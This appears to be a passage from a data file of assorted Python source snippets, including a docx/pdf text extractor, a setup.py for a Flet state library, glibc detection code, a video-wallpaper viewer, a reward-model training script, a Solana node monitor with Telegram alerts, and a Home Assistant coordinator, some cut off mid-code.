cur=self.conn.cursor()\n        r=cur.execute('select Count(*) from temp where phrase=?',(phrase,)).fetchone()\n        return r[0]>0\n\n    def __del__(self):\n        self.conn.close()\n\n    def creat_tables(self):\n        cur=self.conn.cursor()\n        try:\n            sqls=CREATE_TABLES_SQL.split(';')\n            for s in sqls:\n                try:\n                    cur.execute(s)\n                    self.conn.commit()\n                except:\n                    self.conn.rollback()\n\n        except:\n            self.conn.rollback()\n            raise\n\ndef valid_prase(words):\n    if EXWORDS==0:\n        return True\n    cnt=[words.count(w) for w in words]\n    return max(cnt)<EXWORDS\n\ndef write_log(log_name,data):\n    with open(LOG_DIR+log_name,'a',encoding='utf-8') as f:\n        f.write(str(data)+'\\n')\n\ndef get_prase_arr(raw):\n    raw_len=len(raw)\n    if raw_len in WORDS_CHAIN_SIZES:\n        return [raw]\n    elif raw_len<min(WORDS_CHAIN_SIZES):\n        return []\n    else:\n        len_list=[]\n        prase_arr=[]\n        for m in WORDS_CHAIN_SIZES:\n            if m<raw_len:\n                len_list.append(m)\n        for m in len_list:\n            i = 0\n            while i<raw_len:\n                tail=i+m\n                p=raw[i:tail]\n                if len(p)<m:\n                    break\n                prase_arr.append(p)\n                i+=1\n        return prase_arr\n\ndef iter_block_items(parent):\n    \"\"\"\n    Yield each paragraph and table child within *parent*, in document order.\n    Each returned value is an instance of either Table or Paragraph. *parent*\n    would most commonly be a reference to a main Document object, but\n    also works for a _Cell object, which itself can contain paragraphs and tables.\n    \"\"\"\n    if isinstance(parent, Document):\n        parent_elm = parent.element.body\n    elif isinstance(parent, _Cell):\n        parent_elm = parent._tc\n    else:\n        raise ValueError(\"something's not right\")\n\n    for child in parent_elm.iterchildren():\n        if isinstance(child, CT_P):\n            yield Paragraph(child, parent)\n        elif isinstance(child, CT_Tbl):\n            yield Table(child, parent)\n\ndef grouper(iterable, n):\n    args = [iter(iterable)] * n\n    return list(list(n for n in t if n)\n       for t in itertools.zip_longest(*args))\n\ndef get_content_from_doc(path):\n    content=[]\n    try:\n        doc = docx.Document(path)\n\n        res=iter_block_items(doc)\n\n\n        for r in res:\n            if isinstance(r, docx.table.Table):\n                c = r._column_count\n                g = grouper(r._cells, c)\n                for row in g:\n                    t = [x.text for x in row]\n                    s = '\\t'.join(t) #+ '\\n'\n                    content.append(s)\n            else:\n                content.append(r.text.strip())\n    except:\n        pass\n    return '\\n'.join(content)\n\ndef get_content_from_pdf(path):\n    content=[]\n    try:\n        pdf_document = path\n        doc = fitz.open(pdf_document)\n        for i in range(doc.pageCount):\n            page = doc.loadPage(i)\n            content.append(page.getText(\"text\"))\n    except:\n        pass\n    return ''.join(content)\n\ndef get_content_from_qr(",
    "from setuptools import setup, find_packages\n\nsetup(\n    name=\"Neostate\",  # Replace with your library's unique name\n    version=\"0.1.5\",  # Change the version to pre-release\n    author=\"Deku Chaurasia\",\n    author_email=\"angryg575@gmail.com\",\n    description=\"Welcome to Neostate! \ud83c\udf08 A lightweight and intuitive library for managing shared states in Flet applications. With StateCraft, you can bind widgets to a shared state effortlessly, enabling seamless updates across your UI components with minimal boilerplate.\",\n    long_description=open(\"README.md\", encoding=\"utf-8\").read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/dekuChaurasia/Neostate\",  # Add your GitHub repo URL\n    packages=find_packages(),\n    install_requires=[\n        \"flet\",\n        \"requests\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"Neostate=Neostate.cli:main\",\n        ],\n    },\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires=\">=3.6\",\n)\n",
    "from __future__ import annotations\n\nimport collections\nimport contextlib\nimport functools\nimport os\nimport re\nimport sys\nimport warnings\nfrom typing import Generator, Iterator, NamedTuple, Sequence\n\nfrom ._elffile import EIClass, EIData, ELFFile, EMachine\n\nEF_ARM_ABIMASK = 0xFF000000\nEF_ARM_ABI_VER5 = 0x05000000\nEF_ARM_ABI_FLOAT_HARD = 0x00000400\n\n\n# `os.PathLike` not a generic type until Python 3.9, so sticking with `str`\n# as the type for `path` until then.\n@contextlib.contextmanager\ndef _parse_elf(path: str) -> Generator[ELFFile | None, None, None]:\n    try:\n        with open(path, \"rb\") as f:\n            yield ELFFile(f)\n    except (OSError, TypeError, ValueError):\n        yield None\n\n\ndef _is_linux_armhf(executable: str) -> bool:\n    # hard-float ABI can be detected from the ELF header of the running\n    # process\n    # https://static.docs.arm.com/ihi0044/g/aaelf32.pdf\n    with _parse_elf(executable) as f:\n        return (\n            f is not None\n            and f.capacity == EIClass.C32\n            and f.encoding == EIData.Lsb\n            and f.machine == EMachine.Arm\n            and f.flags & EF_ARM_ABIMASK == EF_ARM_ABI_VER5\n            and f.flags & EF_ARM_ABI_FLOAT_HARD == EF_ARM_ABI_FLOAT_HARD\n        )\n\n\ndef _is_linux_i686(executable: str) -> bool:\n    with _parse_elf(executable) as f:\n        return (\n            f is not None\n            and f.capacity == EIClass.C32\n            and f.encoding == EIData.Lsb\n            and f.machine == EMachine.I386\n        )\n\n\ndef _have_compatible_abi(executable: str, archs: Sequence[str]) -> bool:\n    if \"armv7l\" in archs:\n        return _is_linux_armhf(executable)\n    if \"i686\" in archs:\n        return _is_linux_i686(executable)\n    allowed_archs = {\n        \"x86_64\",\n        \"aarch64\",\n        \"ppc64\",\n        \"ppc64le\",\n        \"s390x\",\n        \"loongarch64\",\n        \"riscv64\",\n    }\n    return any(arch in allowed_archs for arch in archs)\n\n\n# If glibc ever changes its major version, we need to know what the last\n# minor version was, so we can build the complete list of all versions.\n# For now, guess what the highest minor version might be, assume it will\n# be 50 for testing. Once this actually happens, update the dictionary\n# with the actual value.\n_LAST_GLIBC_MINOR: dict[int, int] = collections.defaultdict(lambda: 50)\n\n\nclass _GLibCVersion(NamedTuple):\n    major: int\n    minor: int\n\n\ndef _glibc_version_string_confstr() -> str | None:\n    \"\"\"\n    Primary implementation of glibc_version_string using os.confstr.\n    \"\"\"\n    # os.confstr is quite a bit faster than ctypes.DLL. It's also less likely\n    # to be broken or missing. This strategy is used in the standard library\n    # platform module.\n    # https://github.com/python/cpython/blob/fcf1d003bf4f0100c/Lib/platform.py#L175-L183\n    try:\n        # Should be a string like \"glibc 2.17\".\n        version_string: str | None = os.confstr(\"CS_GNU_LIBC_VERSION\")\n        assert version_string is not None\n        _, version = version_string.rsplit()\n    except (AssertionError, AttributeError, OSError, ValueError):\n        # os.confstr() or CS_GNU_LIBC_VERSION not available (or a bad value)...\n        return None\n    return version\n\n\ndef _glibc_version_string_ctypes() -> str | None:\n    \"\"\"\n    Fallback implementation of glibc_version_string using ctypes.\n    \"\"\"\n    try:\n        import ctypes\n    except ImportError:\n        return None\n\n    # ctypes.CDLL(None) internally calls dlopen(NULL), and as the dlopen\n    # manpage says, \"If filename is NULL, then the returned handle is for the\n    # main program\". This way we can let the linker do the work to figure out\n    # which libc our process is actually using.\n    #\n    # We must also handle the special case where the executable is not a\n    # dynamically linked executable. This can occur when using musl libc,\n    # for example. In this situation, dlopen() will error, leading to an\n    # OSError. Interestingly, at least in the case of musl, there is no\n    # errno set on the OSError. The single string argument used to construct\n    # OSError comes from libc itself and is therefore not portable to\n    # hard code here. In any case, failure to call dlopen() means we\n    # can proceed, so we bail on our attempt.\n    try:\n        process_namespace = ctypes.CDLL(None)\n    except OSError:\n        return None\n\n    try:\n        gnu_get_libc_version = process_namespace.gnu_get_libc_version\n    except AttributeError:\n        # Symbol doesn't exist -> therefore, we are not linked to\n        # glibc.\n        return None\n\n    # Call gnu_get_libc_version, which returns a string like \"2.5\"\n    gnu_get_libc_version.restype = ctypes.c_char_p\n    version_str: str = gnu_get_libc_version()\n    # py2 / py3 compatibility:\n    if not isinstance(version_str, str):\n        version_str = version_str.decode(\"ascii\")\n\n    return version_str\n\n\ndef _glibc_version_string() -> str | None:\n    \"\"\"Returns glibc version string, or None if not using glibc.\"\"\"\n    return _glibc_version_string_confstr",
    "#region Imports\n# ==============================================================================\nimport cv2\nimport ffmpeg\nfrom PIL import Image, ImageTk\n\nimport mimetypes\nimport os\nimport random\nimport time\nimport tkinter as tk\nimport uuid\n# ==============================================================================\n\n\n#region Functions\n# ==============================================================================\n\ndef get_files(path: str) -> list:\n    files = []\n    all_items = os.listdir(path)\n\n    for item in all_items:\n        item_path = os.path.join(path, item)\n        if os.path.isfile(item_path):\n            files.append(item_path)\n\n    return files\n\n\ndef is_video(path: str) -> bool:\n    mime_type, _ = mimetypes.guess_type(path)\n    return mime_type is not None and mime_type.startswith(\"video/\")\n\n\ndef select_video(frame_dict: dict) -> tuple[str, int]:\n    keys = list(frame_dict.keys())\n    video = random.choice(keys)\n    frame = random.randint(0, frame_dict[video])\n    return video, frame\n\n\ndef get_frame_count(file_path: str) -> int:\n    metadata = ffmpeg.probe(file_path)\n    streams = [ s for s in metadata['streams'] if s['codec_type'] == 'video' ]\n    video_stream = streams[0]\n    frame_count = video_stream.get('tags', {}).get('NUMBER_OF_FRAMES')\n    return frame_count\n\n\ndef extract_frame(file: str, frame: int) -> Image.Image | None:\n    try:\n        capture = cv2.VideoCapture(file)\n        capture.set(cv2.CAP_PROP_POS_FRAMES, frame)\n        success, frame = capture.read()\n        \n        if success:\n            return Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))\n        return None\n        \n    finally:\n        capture.release()\n\n\ndef resize_image(image, win_width = 1920, win_height = 1080) -> Image.Image:\n    image_width, image_height = image.size\n\n    width_scale = win_width / image_width\n    height_scale = win_height / image_height\n    scale_factor = min(width_scale, height_scale)\n    \n    new_width = int(image_width * scale_factor)\n    new_height = int(image_height * scale_factor)\n    return image.resize((new_width, new_height), Image.Resampling.LANCZOS)\n\n\ndef get_wallpaper() -> Image.Image | None:\n    selected_video, selected_frame = select_video(frame_dict)\n    extracted_frame = extract_frame(selected_video, selected_frame)\n    return extracted_frame\n\n\ndef prev_image():\n    global current_frame, wallpaper_frames, frame_index\n\n    if frame_index == 0:\n        return\n    else:\n        frame_index -= 1\n\n    current_frame = wallpaper_frames[frame_index]\n    resized = resize_image(current_frame, window.winfo_width(), window.winfo_height())\n    tk_image = ImageTk.PhotoImage(resized)\n    image_label.config(image=tk_image)\n    image_label.image = tk_image\n\n\ndef save_image():\n    global current_frame\n    filename = f\"{output_dir}/{export_prefix}_{uuid.uuid4()}.png\"\n    current_frame.save(filename)\n    print(f\"Saved Image to {filename}\")\n\n\ndef next_image():\n    global current_frame, wallpaper_frames, frame_index\n\n    if frame_index+1 == len(wallpaper_frames):\n        wallpaper_frames.append(get_wallpaper())\n    \n    frame_index += 1\n    current_frame = wallpaper_frames[frame_index]\n\n    resized = resize_image(current_frame, window.winfo_width(), window.winfo_height())\n    tk_image = ImageTk.PhotoImage(resized)\n    image_label.config(image=tk_image)\n    image_label.image = tk_image\n\n\ndef key_handler_previous_image(event):\n    prev_image()\n\n\ndef key_handler_save_image(event):\n    save_image()\n\n\ndef key_handler_next_image(event):\n    next_image()\n\n\ndef key_handler_quit(event):\n    window.quit()\n\n# ==============================================================================\n\n\n#region Base Values\n# ==============================================================================\n\ninput_dir        = \"videos\"\noutput_dir       = \"wallpapers\"\nexport_prefix    = \"wallpaper\"\nwindow_width     = 1920\nwindow_height    = 1080\nbtn_width        = 10\nframe_index      = 0\ndir_path         = os.path.join(input_dir)\nscanned_files    = get_files(dir_path)\nfiles            = [ file for file in scanned_files if is_video(file) ]\nframe_dict       = { file: int(get_frame_count(file)) for file in files }\ncurrent_frame    = get_wallpaper()\nresized_frame    = resize_image(current_frame, window_width, window_height)\nwallpaper_frames = []\nwallpaper_frames.append(current_frame)\n\npreload_amount = 15\npreload_start = time.time()\n\nfor i in range(preload_amount):\n    start = time.time()\n    wallpaper = get_wallpaper()\n    wallpaper_frames.append(wallpaper)\n    stop = time.time()\n    print(f\"Took {stop - start:3f} Seconds to Preaload Image {i + 1} / {preload_amount}\")\n\npreload_end = time.time()\nprint(f\"Preloaded {preload_amount} Images in {preload_end - preload_start:3f} Seconds\")\n\n# ==============================================================================\n\n\n#region Tkinter Window\n# ==============================================================================\n\nwindow = tk.Tk()\nwindow.title = \"Wallpapers\"\nwindow.geomet",
    "from dataclasses import dataclass, field\nfrom typing import Any, Dict, List, Optional, Union\n\nimport evaluate\nimport numpy as np\nimport torch\nimport torch.nn as nn\nfrom datasets import load_dataset\nfrom peft import LoraConfig, TaskType, get_peft_model\nfrom transformers import (\n    AutoModelForSequenceClassification,\n    AutoTokenizer,\n    HfArgumentParser,\n    PreTrainedTokenizerBase,\n    Trainer,\n    TrainerCallback,\n    TrainingArguments,\n)\nfrom transformers.utils import PaddingStrategy\n\n\n# Define and parse arguments.\n@dataclass\nclass ScriptArguments:\n    \"\"\"\n    These arguments vary depending on how many GPUs you have, what their capacity and features are, and what size model you want to train.\n    \"\"\"\n\n    local_rank: Optional[int] = field(default=-1, metadata={\"help\": \"Used for multi-gpu\"})\n    resume_from_checkpoint: Optional[bool] = field(\n        default=False,\n        metadata={\"help\": \"If you want to resume training where it left off.\"},\n    )\n    deepspeed: Optional[str] = field(\n        default=None,\n        metadata={\n            \"help\": \"Path to deepspeed config if using deepspeed. You may need this if the model that you want to train doesn't fit on a single GPU.\"\n        },\n    )\n    per_device_train_batch_size: Optional[int] = field(default=4)\n    per_device_eval_batch_size: Optional[int] = field(default=1)\n    gradient_accumulation_steps: Optional[int] = field(default=1)\n    learning_rate: Optional[float] = field(default=2e-5)\n    weight_decay: Optional[float] = field(default=0.001)\n    model_name: Optional[str] = field(\n        default=\"gpt2\",\n        metadata={\n            \"help\": \"The model that you want to train from the Hugging Face hub. E.g. gpt2, gpt2-xl, bert, etc.\"\n        },\n    )\n    tokenizer_name: Optional[str] = field(\n        default=None,\n        metadata={\n            \"help\": \"The tokenizer for your model, if left empty will use the default for your model\",\n        },\n    )\n    bf16: Optional[bool] = field(\n        default=True,\n        metadata={\n            \"help\": \"This essentially cuts the training time in half if you want to sacrifice a little precision and have a supported GPU.\"\n        },\n    )\n    num_train_epochs: Optional[int] = field(\n        default=1,\n        metadata={\"help\": \"The number of training epochs for the reward model.\"},\n    )\n    train_subset: Optional[int] = field(\n        default=100000,\n        metadata={\"help\": \"The size of the subset of the training data to use\"},\n    )\n    eval_subset: Optional[int] = field(\n        default=50000,\n        metadata={\"help\": \"The size of the subset of the eval data to use\"},\n    )\n    gradient_checkpointing: Optional[bool] = field(\n        default=False,\n        metadata={\"help\": \"Enables gradient checkpointing.\"},\n    )\n    optim: Optional[str] = field(\n        default=\"adamw_hf\",\n        metadata={\"help\": \"The optimizer to use.\"},\n    )\n    lr_scheduler_type: Optional[str] = field(\n        default=\"linear\",\n        metadata={\"help\": \"The lr scheduler\"},\n    )\n    max_length: Optional[int] = field(default=512)\n    eval_first_step: Optional[bool] = field(\n        default=False,\n        metadata={\"help\": \"Whether to run eval after the first step\"},\n    )\n\n\nparser = HfArgumentParser(ScriptArguments)\nscript_args = parser.parse_args_into_dataclasses()[0]\n\n# Load the human stack-exchange-paired dataset for tuning the reward model.\ntrain_dataset = load_dataset(\"lvwerra/stack-exchange-paired\", data_dir=\"data/reward\", split=\"train\")\nif script_args.train_subset > 0:\n    train_dataset = train_dataset.select(range(script_args.train_subset))\neval_dataset = load_dataset(\"lvwerra/stack-exchange-paired\", data_dir=\"data/evaluation\", split=\"train\")\nif script_args.eval_subset > 0:\n    eval_dataset = eval_dataset.select(range(script_args.eval_subset))\n# Define the training args. Needs to be done before the model is loaded if you are using deepspeed.\nmodel_name_split = script_args.model_name.split(\"/\")[-1]\noutput_name = (\n    f\"{model_name_split}_peft_stack-exchange-paired_rmts__{script_args.train_subset}_{script_args.learning_rate}\"\n)\n\ntraining_args = TrainingArguments(\n    output_dir=output_name,\n    learning_rate=script_args.learning_rate,\n    per_device_train_batch_size=script_args.per_device_train_batch_size,\n    per_device_eval_batch_size=script_args.per_device_eval_batch_size,\n    num_train_epochs=script_args.num_train_epochs,\n    weight_decay=script_args.weight_decay,\n    evaluation_strategy=\"steps\",\n    eval_steps=500,\n    save_strategy=\"steps\",\n    save_steps=500,\n    gradient_accumulation_steps=script_args.gradient_accumulation_steps,\n    gradient_checkpointing=script_args.gradient_checkpointing,\n    deepspeed=script_args.deepspeed,\n    local_rank=script_args.local_rank,\n    remove_unused_columns=False,\n    label_names=[],\n    bf16=script_args.bf16,\n    logging_strategy=\"steps\",\n    logging_steps=10,\n    optim=script_args.optim,\n    lr_scheduler_type=script_args.lr_scheduler_type,\n)\n# Load the value-head model and token",
    "import requests\nimport time\nimport logging\nfrom dotenv import load_dotenv\nimport os\n\n# Load environment variables from a .env file\nload_dotenv()\n\n# Configure logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format=\"%(asctime)s - %(levelname)s - %(message)s\",\n    handlers=[\n        logging.FileHandler(\"node_sync_monitor.log\"),\n        logging.StreamHandler()\n    ]\n)\n\n# Configuration\nLOCAL_RPC_URL = os.getenv(\"LOCAL_RPC_URL\", \"http://localhost:8899\")  # Your node's RPC URL\nREFERENCE_RPC_URL = os.getenv(\"REFERENCE_RPC_URL\", \"https://api.mainnet-beta.solana.com\")  # Reference node RPC URL\nTELEGRAM_BOT_TOKEN = os.getenv(\"TELEGRAM_BOT_TOKEN\")     # Telegram bot token\nTELEGRAM_CHAT_ID = os.getenv(\"TELEGRAM_CHAT_ID\")         # Telegram chat ID\nMESSAGE_THREAD_ID = os.getenv(\"MESSAGE_THREAD_ID\") \nCHECK_INTERVAL = int(os.getenv(\"CHECK_INTERVAL\", 10))    # Interval to check sync status (seconds)\nSYNC_THRESHOLD = int(os.getenv(\"SYNC_THRESHOLD\", 100))   # Threshold for out-of-sync detection (slots)\n\nif not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:\n    raise ValueError(\"TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set in the environment.\")\n\ndef send_telegram_message(message):\n    \"\"\"\n    Send a message to the specified Telegram chat.\n    \"\"\"\n    try:\n        url = f\"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage\"\n        payload = {\"chat_id\": TELEGRAM_CHAT_ID,\"message_thread_id\": MESSAGE_THREAD_ID, \"text\": message}\n        response = requests.post(url, json=payload, timeout=5)\n        response.raise_for_status()\n        logging.info(\"Telegram notification sent successfully.\")\n    except requests.RequestException as e:\n        logging.error(f\"Failed to send Telegram message: {e}\")\n\ndef get_slot(rpc_url):\n    \"\"\"\n    Fetch the current slot from the given RPC URL using the 'getSlot' method.\n    \"\"\"\n    try:\n        response = requests.post(\n            rpc_url,\n            json={\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"getSlot\"},\n            timeout=5\n        )\n        response.raise_for_status()\n        return response.json().get(\"result\")\n    except requests.RequestException as e:\n        logging.error(f\"Error fetching slot from {rpc_url}: {e}\")\n        return None\n\ndef check_sync_status(previously_out_of_sync):\n    \"\"\"\n    Check if the node is in sync with the reference node and notify if out of sync or caught up.\n    \"\"\"\n    local_slot = get_slot(LOCAL_RPC_URL)\n    reference_slot = get_slot(REFERENCE_RPC_URL)\n\n    if local_slot is None or reference_slot is None:\n        logging.warning(\"Unable to fetch slot data. Skipping sync check.\")\n        return previously_out_of_sync\n\n    slot_difference = reference_slot - local_slot\n    logging.info(f\"Local slot: {local_slot}, Reference slot: {reference_slot}, Difference: {slot_difference}\")\n\n    if slot_difference > SYNC_THRESHOLD:\n        message = (\n            f\"\\u26A0\\uFE0F Node is out of sync!\\n\"\n            f\"Local slot: {local_slot}\\n\"\n            f\"Reference slot: {reference_slot}\\n\"\n            f\"Difference: {slot_difference} slots\"\n        )\n        logging.warning(message)\n        send_telegram_message(message)\n        return True\n    elif previously_out_of_sync:\n        message = (\n            f\"\\u2705 Node has caught up and is now in sync!\\n\"\n            f\"Local slot: {local_slot}\\n\"\n            f\"Reference slot: {reference_slot}\\n\"\n            f\"Difference: {slot_difference} slots\"\n        )\n        logging.info(message)\n        send_telegram_message(message)\n\n    logging.info(\"Node is in sync.\")\n    return False\n\ndef main():\n    \"\"\"\n    Main loop to periodically check sync status.\n    \"\"\"\n    previously_out_of_sync = False\n    while True:\n        try:\n            previously_out_of_sync = check_sync_status(previously_out_of_sync)\n            time.sleep(CHECK_INTERVAL)\n        except KeyboardInterrupt:\n            logging.info(\"Monitoring stopped by user.\")\n            break\n        except Exception as e:\n            logging.error(f\"Unexpected error in main loop: {e}\")\n            time.sleep(CHECK_INTERVAL)\n\nif __name__ == \"__main__\":\n    main()\n",
    "from openai import OpenAI\nimport requests\n\n# \u062a\u0646\u0638\u06cc\u0645\u0627\u062a\nAPI_KEY = '\u06a9\u0644\u06cc\u062f \u0627\u06cc \u06a9\u0647 \u0628\u0627\u06cc\u062f \u0627\u0632 \u0645\u062a\u06cc\u0633 \u062f\u0631\u06cc\u0627\u0641\u062a \u06a9\u0646\u06cc\u062f'\nBaseUrl = 'https://api.metisai.ir/openai/v1'\n\n# \u0627\u06cc\u062c\u0627\u062f \u06a9\u0644\u0627\u06cc\u0646\u062a OpenAI\nclient = OpenAI(\n    base_url=BaseUrl,\n    api_key=API_KEY,\n)\n\ndef generate_ai_document(title, content):\n    \"\"\"\n    \u062a\u0648\u0644\u06cc\u062f \u062f\u0627\u06a9\u06cc\u0648\u0645\u0646\u062a \u062d\u0631\u0641\u0647\u200c\u0627\u06cc \u0628\u0627 \u0627\u0633\u062a\u0641\u0627\u062f\u0647 \u0627\u0632 OpenAI \u06cc\u0627 \u0633\u0631\u0648\u0631 \u0645\u0634\u0627\u0628\u0647.\n    \"\"\"\n    prompt = f\"\"\"\nYou are an advanced AI specialized in creating high-quality, modern HTML documents. Your task is to generate a professional, responsive, and visually stunning HTML page based on the following specifications:\n\n1. **Design & Theme**:\n    - The overall color scheme of the website should be **black and red** to ensure a modern and sleek look.\n    - Use high-quality design principles for a professional, visually appealing, and sophisticated user interface.\n\n2. **HTML & CSS**:\n    - Use modern **HTML5** and **CSS3** best practices for a clean and efficient codebase.\n    - Ensure proper **semantic HTML** (e.g., `<header>`, `<footer>`, `<article>`, `<section>`, `<nav>`, etc.) for accessibility and SEO.\n    - Create a responsive layout that adapts seamlessly to different screen sizes (desktop, tablet, mobile).\n    - Implement a **left-side vertical navigation bar** that remains fixed while scrolling the page, allowing users to easily navigate the content.\n    - Include **smooth scrolling** functionality for navigation links that lead to different sections of the page.\n    - Apply CSS techniques to ensure **readable fonts** and a **visually pleasing color contrast**.\n\n3. **Content Structure**:\n    - Organize content into clearly defined sections using **headings**, **subheadings**, and proper **HTML tags** (e.g., `<h1>`, `<h2>`, `<p>`, etc.).\n    - If applicable, include a **Table of Contents** that is linked to relevant sections of the page.\n    - Group related content into **cards** or **sections** to enhance readability and presentation.\n\n4. **Interactive Elements**:\n    - Use **interactive elements** like buttons or hover effects, enhancing the user experience and making the page more engaging.\n    - Implement **responsive grids** and **flexbox** layouts for content that adjusts according to the screen size.\n    - Add **JavaScript** functionality to enhance interaction, such as:\n        - **Scroll animation** for smooth transitions between sections.\n        - **Dynamic content loading** based on user interactions.\n        - **Collapsible sections** or **modals** for better content presentation.\n        - **Form validation** for any forms used on the page.\n        - **Sticky navigation** that becomes active once the user scrolls past the header.\n\n5. **Highlight Important Content**:\n    - Emphasize key content using **HTML tags** like `<strong>`, `<em>`, or `<blockquote>` to ensure important elements stand out.\n\n6. **Final Output**:\n    - The final output should be **clean**, **professional**, and **ready to be deployed** in a live website. It should require minimal adjustments and be optimized for speed and performance.\n\n**Title**: {title}\n\n**Content**: {content}\n\nPlease ensure the page has an **innovative and stylish design** with a strong **red and black color scheme**, **easy-to-read typography**, and **interactive navigation** that makes the user experience seamless and intuitive. Use **JavaScript** to enhance the interactivity and dynamic features of the page, making it feel modern and responsive.\n\n\"\"\"\n\n    try:\n        # \u0627\u0631\u0633\u0627\u0644 \u062f\u0631\u062e\u0648\u0627\u0633\u062a \u0628\u0647 API\n        response = client.chat.completions.create(\n            model=\"gpt-4o-mini\",\n            messages=[\n                {\"role\": \"system\", \"content\": \"You are a helpful assistant.\"},\n                {\"role\": \"user\", \"content\": prompt}\n            ]\n        )\n\n        # \u062f\u0633\u062a\u0631\u0633\u06cc \u0628\u0647 \u0645\u062d\u062a\u0648\u0627\u06cc \u067e\u0627\u0633\u062e\n        generated_text = response.choices[0].message.content.strip()\n        return generated_text\n    except Exception as e:\n        raise Exception(f\"Error generating document: {str(e)}\")\n\n",
    "from decimal import Decimal\n\nimport requests\n\n\nclass ExchangeRateAPI:\n    _api_url: str = \"https://hexarate.paikama.co/api/rates/latest\"\n    _rates_cache: dict[str, Decimal] = {}\n\n    @classmethod\n    def get_rate(cls, from_currency: str, to_currency: str) -> Decimal:\n        \"\"\"Get exchange rate from Hexarate API\"\"\"\n        cache_key = f\"{from_currency}-{to_currency}\"\n        if cache_key in cls._rates_cache:\n            return cls._rates_cache[cache_key]\n\n        try:\n            response = requests.get(\n                f\"{cls._api_url}/{from_currency}\", params={\"target\": to_currency}\n            )\n            response.raise_for_status()\n            data = response.json()\n            if data[\"status_code\"] != 200:\n                raise ValueError(f\"API returned error status: {data['status_code']}\")\n            rate = Decimal(str(data[\"data\"][\"mid\"]))\n            cls._rates_cache[cache_key] = rate\n            return rate\n        except Exception as e:\n            raise ValueError(f\"Failed to get exchange rate: {str(e)}\") from e\n",
    "import yfinance as yf\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.preprocessing import MinMaxScaler\nfrom sklearn.metrics import mean_squared_error  \nfrom tensorflow.keras.models import Sequential  # type: ignore\nfrom tensorflow.keras.layers import LSTM, Dense # type: ignore\n\n\nstock_data = yf.download('VOD', start='2015-01-01', end='2025-01-02')\nprint(\"Stock Data Sample:\")\nprint(stock_data.head())\n\n\nstock_data['50_MA'] = stock_data['Close'].rolling(window=50).mean()\nstock_data['200_MA'] = stock_data['Close'].rolling(window=200).mean()\n\n\nstock_data = stock_data.dropna()\n\n\nfeatures = ['Close', 'Volume', '50_MA', '200_MA']\ntarget = 'Close'\nX = stock_data[features]\ny = stock_data[target]\n\n\nplt.figure(figsize=(14, 7))\nplt.plot(stock_data['Close'], label='Close Price')\nplt.plot(stock_data['50_MA'], label='50-day Moving Average')\nplt.plot(stock_data['200_MA'], label='200-day Moving Average')\nplt.legend()\nplt.title('Stock Price with Moving Averages')\nplt.show()\n\n\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n\nscaler = MinMaxScaler()\nX_train_scaled = scaler.fit_transform(X_train)\nX_test_scaled = scaler.transform(X_test)\n\ndef create_sequences(data, seq_length):\n    sequences = []\n    for i in range(len(data) - seq_length):\n        seq = data[i:i + seq_length]\n        label = data[i + seq_length, 0] \n        sequences.append((seq, label))\n    return sequences\n\nseq_length = 60  \ndata_scaled = scaler.fit_transform(X[['Close']])\nsequences = create_sequences(data_scaled, seq_length)\n\nX_seq = np.array([seq[0] for seq in sequences])\ny_seq = np.array([seq[1] for seq in sequences])\n\nX_train_seq, X_test_seq, y_train_seq, y_test_seq = train_test_split(X_seq, y_seq, test_size=0.2, random_state=42)\n\n\nmodel = Sequential([\n    LSTM(50, return_sequences=True, input_shape=(X_train_seq.shape[1], X_train_seq.shape[2])),\n    LSTM(50, return_sequences=False),\n    Dense(25),\n    Dense(1)\n])\n\nmodel.compile(optimizer='adam', loss='mean_squared_error')\nmodel.summary()\n\n\nmodel.fit(X_train_seq, y_train_seq, epochs=10, batch_size=32, verbose=1)\n\n\npredicted = model.predict(X_test_seq)\npredicted = scaler.inverse_transform(predicted)\n\n\ny_test_scaled = scaler.inverse_transform(y_test_seq.reshape(-1, 1))\n\nplt.figure(figsize=(14, 7))\nplt.plot(y_test_scaled, label='True Prices')\nplt.plot(predicted, label='Predicted Prices')\nplt.legend()\nplt.title('True vs Predicted Stock Prices')\nplt.show()\n\nmse = mean_squared_error(y_test_scaled, predicted)\nprint(f\"Mean Squared Error: {mse}\")\n",
    "\"\"\"\nCoordonator de date pentru integrarea Hidroelectrica Rom\u00e2nia.\n\"\"\"\n\nimport logging\nfrom datetime import datetime, timedelta\n\nfrom homeassistant.core import HomeAssistant\nfrom homeassistant.helpers.update_coordinator import DataUpdateCoordinator, UpdateFailed\n\nfrom .const import (\n    DOMAIN,\n    CONF_USERNAME,\n    CONF_PASSWORD,\n    CONF_UPDATE_INTERVAL,\n)\nfrom .api import HidroelectricaAPI\n\n_LOGGER = logging.getLogger(__name__)\n\nclass HidroelectricaCoordinator(DataUpdateCoordinator):\n    \"\"\"\n    Coordonatorul principal de date pentru Hidroelectrica.\n    Folose\u0219te HidroelectricaAPI (sincron) \u0219i ruleaz\u0103 sub form\u0103 asincron\u0103 prin async_add_executor_job.\n    \"\"\"\n\n    def __init__(self, hass: HomeAssistant, entry):\n        \"\"\"\n        :param hass: Instan\u021ba principal\u0103 Home Assistant\n        :param entry: ConfigEntry ce con\u021bine user, parola, update_interval\n        \"\"\"\n        self.hass = hass\n        self.entry = entry\n\n        self.username = entry.data[CONF_USERNAME]\n        self.password = entry.data[CONF_PASSWORD]\n        self.update_interval_seconds = entry.data.get(CONF_UPDATE_INTERVAL, 3600)\n\n        # Instan\u021biem API-ul (login-ul \u00eel facem ulterior, \u00een _async_update_data)\n        self.api = HidroelectricaAPI(self.username, self.password)\n\n        super().__init__(\n            hass,\n            _LOGGER,\n            name=f\"{DOMAIN}_coordinator\",\n            update_interval=timedelta(seconds=self.update_interval_seconds),\n        )\n\n        # Structur\u0103 ini\u021bial\u0103 goal\u0103\n        self.data = {\n            \"utility_accounts\": [],\n            \"accounts_data\": {}\n        }\n\n    async def 